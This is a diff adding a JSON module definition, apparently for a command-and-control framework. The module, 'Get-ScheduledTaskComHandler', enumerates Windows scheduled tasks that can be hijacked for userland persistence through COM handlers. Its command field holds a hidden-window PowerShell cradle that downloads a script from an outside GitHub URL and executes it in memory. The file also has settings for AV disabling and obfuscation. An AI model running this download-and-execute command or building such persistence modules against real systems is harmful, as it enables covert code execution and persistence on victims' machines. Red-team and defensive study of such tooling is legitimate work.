@@ -1,0 +1,37 @@
+{
+  "base": {
+    "name": "Get-ScheduledTaskComHandler",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Matt Nelson (@enigma0x3)","Matthew Graeber (@mattifestation)"],
+    "path": ["windows", "x64", "powershell", "persistence", "Get-ScheduledTaskComHandler.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "powershell",
+    "privilege": false,
+    "remote": "https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Get-ScheduledTaskComHandler.ps1",
+    "local": ["data", "src", "enigma0x3", "Misc-PowerShell-Stuff", "Get-ScheduledTaskComHandler.ps1"],
+    "options": [
+      {"name": "OnLogon", "value": null, "required": false, "flag": "-OnLogon", "description":"Shows all Tasks that start on logon & associated CLSIDS/DLLs."},
+      {"name": "PersistenceLocations", "value": null, "required": false, "flag": "-PersistenceLocations", "description":"Shows all Tasks that are able to be Hijacked for userland persistence"}
+    ],
+    "description": "Checks all scheduled tasks that execute on user logon & have a \"Custom handler\" set. This will expose tasks that are able to be abused for userland persistence via COM handler hijacking.",
+    "notes": "This module only facilitates enumeration. You must manually set persistence.\r\nBLOG: https://enigma0x3.net/2016/05/25/userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w",
+      "0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Get-ScheduledTaskComHandler.ps1');",
+      "Get-ScheduledTaskComHandler",
+      "{{OnLogon.Flag}}",
+      "{{PersistenceLocations.Flag}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": false,
+    "obfuscate": false,
+    "base64": false
+  }
+}
